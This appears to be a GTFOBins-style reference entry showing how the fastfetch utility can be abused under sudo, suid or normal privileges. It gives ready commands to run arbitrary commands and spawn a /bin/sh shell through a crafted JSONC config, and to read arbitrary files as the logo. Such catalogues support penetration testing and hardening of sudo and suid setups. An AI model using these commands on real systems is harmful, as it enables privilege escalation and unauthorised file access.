---
type: gtfobin
name: fastfetch
platform: Unix
functions: [command, file-read, shell]
tags: [gtfobin, unix, lotl]
---

# fastfetch

## command

```bash
echo '{"modules":[{"type":"command","key":"x","text":"exec /path/to/command"}]}' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc
```
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
fastfetch --file /path/to/input-file
```
_The file content is used as the logo while some other information is displayed on its right._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
echo '{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc
```
**Contexts:** sudo, suid, unprivileged
